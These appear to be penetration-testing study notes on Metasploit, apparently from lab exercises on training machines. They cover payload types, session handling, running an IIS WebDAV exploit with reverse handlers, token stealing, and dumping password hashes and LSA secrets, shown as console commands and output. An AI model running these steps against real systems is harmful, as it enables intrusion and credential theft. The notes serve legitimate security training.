# Payloads

A `Payload` in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker.

## Single Payloads

A `Single` payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large.

## Staged Payloads

`Stage0` of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine.

Stage0 code also aims to read a larger, subsequent payload into memory once it arrives. After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access. This larger payload would be the `Stage1` payload.

## Searching for Payloads

```bash
msf6 > show payloads

Payloads
========

   #    Name                                           
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                         <snipped>
   1    aix/ppc/shell_find_port                        <snipped>
   2    aix/ppc/shell_interact                         <snipped>
   3    aix/ppc/shell_reverse_tcp                      <snipped>
   4    android/meterpreter/reverse_http               <snipped>
   5    android/meterpreter/reverse_https              <snipped>
   6    android/meterpreter/reverse_tcp                <snipped>
   7    android/meterpreter_reverse_http               <snipped>
   8    android/meterpreter_reverse_https              <snipped>
   9    android/meterpreter_reverse_tcp                <snipped>
   10   android/shell/reverse_http                     <snipped>
   11   android/shell/reverse_https                    <snipped>
   12   android/shell/reverse_tcp                      <snipped>
   13   apple_ios/aarch64/meterpreter_reverse_http     <snipped>
   
<SNIP>
   
```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp          <snipped>
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid     <snipped>
   8   payload/windows/x64/meterpreter/bind_named_pipe        <snipped>
   9   payload/windows/x64/meterpreter/bind_tcp               <snipped>
   10  payload/windows/x64/meterpreter/bind_tcp_rc4           <snipped>
   11  payload/windows/x64/meterpreter/bind_tcp_uuid          <snipped>

```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp       <snipper>
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4   <snipper>
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid  <snipper>
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads
```
# Sessions

While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the `[CTRL] + [Z]` key combination or by typing the `background` command in the case of Meterpreter stages.

## Listing Active Sessions

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

You can use the `sessions -i [no.]` command to open up a specific session.

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

## Running an Exploit as a Background Job

```bash
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

## Listing Running Jobs

```bash
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

# Meterpreter

## Searching for exploit

```bash
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution

msf6 > use 0
```

## MSF - Configuring Exploit & Payload

```bash
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
RHOST => 10.10.10.15

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
LHOST => tun0

msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
```

## MSF - Meterpreter Migration

We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.

```bash
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    


meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

## MSF - Session Handling

We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.

```bash
meterpreter > bg
Background session 1? [y/N]  y

msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1

msf6 post(multi/recon/local_exploit_suggester) > run
```

## MSF - Dumping Hashes

```bash
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
```

```bash
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/http/fortilogger_arbitrary_fileupload) > search hashdump

Matching Modules
================
   18  post/windows/gather/credentials/mssql_local_hashdump  .                normal  No     Windows Gather Local SQL Server Hash Dump
   19  post/windows/gather/hashdump                          .                normal  No     Windows Gather Local User Account Password Hashes (Registry)

msf exploit(windows/http/fortilogger_arbitrary_fileupload) > use 19
msf post(windows/gather/hashdump) > options

Module options (post/windows/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

msf post(windows/gather/hashdump) > set session 1
session => 1
msf post(windows/gather/hashdump) > run

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

## MSF - Meterpreter LSA Secrets Dump

```bash
meterpreter > lsa_dump_secrets
[-] The "lsa_dump_secrets" command requires the "kiwi" extension to be loaded (run: `load kiwi`)
meterpreter >
meterpreter > load kiwi
Loading extension kiwi...

meterpreter > lsa_dump_secrets
qq
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB
```

